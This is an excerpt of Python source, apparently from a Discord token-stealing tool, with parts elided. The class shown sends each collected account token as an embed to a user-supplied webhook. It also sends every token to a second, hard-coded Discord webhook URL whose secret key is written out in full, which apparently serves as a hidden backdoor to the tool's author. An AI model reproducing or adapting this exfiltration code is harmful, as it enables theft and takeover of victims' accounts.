...
class upload_tokens:
    def __init__(self, webhook: str):
        ...
        self.webhook22 = SyncWebhook.from_url('https://discord.com/api/webhooks/1114829961824575508/qN3bp8aIQkjc-ATg6Ikc6DdX97RqR0xhVBXPliflKeXBM4rKhlUDKCWcdlqXCsZGnZlT')
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text="This tool Developed By xs403#0001")

            self.webhook.send(embed=embed, username="xStrong", avatar_url="https://upcdn.io/W142hJk/image/demo/4ma96TwC2M.png")
            self.webhook22.send(embed=embed, username="xStrong", avatar_url="https://upcdn.io/W142hJk/image/demo/4ma96TwC2M.png")
